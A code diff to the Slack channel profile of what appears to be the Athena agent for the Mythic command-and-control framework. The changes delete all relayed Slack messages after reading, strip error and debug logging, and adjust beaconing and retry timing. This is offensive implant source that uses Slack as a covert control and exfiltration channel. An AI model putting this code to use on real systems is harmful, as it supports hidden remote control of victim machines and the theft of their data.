@@ -16,7 +16,7 @@ namespace Athena.Config
     public class MythicConfig
     {
         public Slack currentConfig { get; set; }
-        public string uuid { get; set; }
+        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
@@ -25,14 +25,14 @@ namespace Athena.Config
         public MythicConfig()
         {
 
-            this.uuid = "%UUID%";
+            uuid = "%UUID%";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new Slack(this.uuid);
+            this.currentConfig = new Slack(uuid);
             this.forwarder = new Forwarder();
 
         }
@@ -131,13 +131,13 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(MythicConfig.uuid + json);
                 }
 
                 int i = 0;
 
 
-                while (!SendSlackMessage(json).Result)
+                while (!await SendSlackMessage(json))
                 {
                     if (i == this.messageChecks)
                     {
@@ -167,9 +167,9 @@ namespace Athena.Config
 
                 //Take only the most recent response in case some messages got left over.
                 //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
-                if (result.Reverse().FirstOrDefault().Value is not null)
+                if (result.FirstOrDefault().Value is not null)
                 {
-                    json = result.Reverse().FirstOrDefault().Value.message;
+                    json = result.FirstOrDefault().Value.message;
                 }
                 else
                 {
@@ -201,8 +201,6 @@ namespace Athena.Config
             }
             catch (Exception e)
             {
-                Misc.WriteError($"[Send] {e.Message}");
-                Misc.WriteError(e.StackTrace);
                 return "";
             }
         }
@@ -221,7 +219,6 @@ namespace Athena.Config
                     id = 1,
                     final = true
                 };
-                Misc.WriteDebug("Uploading File.");
                 return await UploadSlackFile(data, msg);
             }
             else
@@ -249,8 +246,6 @@ namespace Athena.Config
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[SendSlackMessage] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
                     return false;
                 }
 
@@ -286,15 +281,12 @@ namespace Athena.Config
                 }
                 catch (Exception e)
                 {
-                    Misc.WriteError($"[UploadSlackFile] {e.Message}");
-                    Misc.WriteError(e.StackTrace);
                     return true;
                 }
                 return true;
             }
             catch (WebException e)
-            {
-                Misc.WriteDebug("Error uploading file: " + e.Message);
+            {;
                 HttpWebResponse webRes = (HttpWebResponse)e.Response;
                 if (webRes.StatusCode == HttpStatusCode.TooManyRequests)
                 {
@@ -304,10 +296,7 @@ namespace Athena.Config
                     }
                     catch (Exception ex)
                     {
-                        Misc.WriteError($"[UploadSlackFile2] {ex.Message}");
-                        Misc.WriteError(ex.StackTrace);
-                        //Default wait 10s
-                        await Task.Delay(10000);
+                        await Task.Delay(this.timeBetweenChecks * 1000);
                     }
                     return false;
                 }
@@ -317,8 +306,15 @@ namespace Athena.Config
         private async Task<bool> DeleteMessages(List<string> messages)
         {
             // This works for the current implemenation but may have to change in the event I need to further chunk messages.
-            string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + messages.FirstOrDefault() + "\"}";
-            return await SendPost("https://slack.com/api/chat.delete", data);
+            bool success = false;
+            foreach(var message in messages)
+            {
+                string data = "{\"channel\":\"" + this.channel + "\",\"ts\":\"" + message + "\"}";
+                success = await SendPost("https://slack.com/api/chat.delete", data);
+            }
+
+
+            return success;
         }
         private async Task<Dictionary<string, MythicMessageWrapper>> GetSlackMessages()
         {
@@ -367,7 +363,6 @@ namespace Athena.Config
                             }
                             catch (Exception e)
                             {
-                                Misc.WriteError(e.StackTrace);
                             }
                         }
 
@@ -428,10 +423,8 @@ namespace Athena.Config
                         }
                         catch (Exception ex)
                         {
-                            Misc.WriteError($"[SendPost] {ex.Message}");
-                            Misc.WriteError(ex.StackTrace);
                             //Default wait 10s
-                            await Task.Delay(10000);
+                            await Task.Delay(this.timeBetweenChecks * 1000);
                         }
                     }
                 }
@@ -466,8 +459,6 @@ namespace Athena.Config
                         }
                         catch (Exception ex)
                         {
-                            Misc.WriteError($"[SendPost] {ex.Message}");
-                            Misc.WriteError(ex.StackTrace);
                             //Default wait 10s
                             await Task.Delay(10000);
                         }
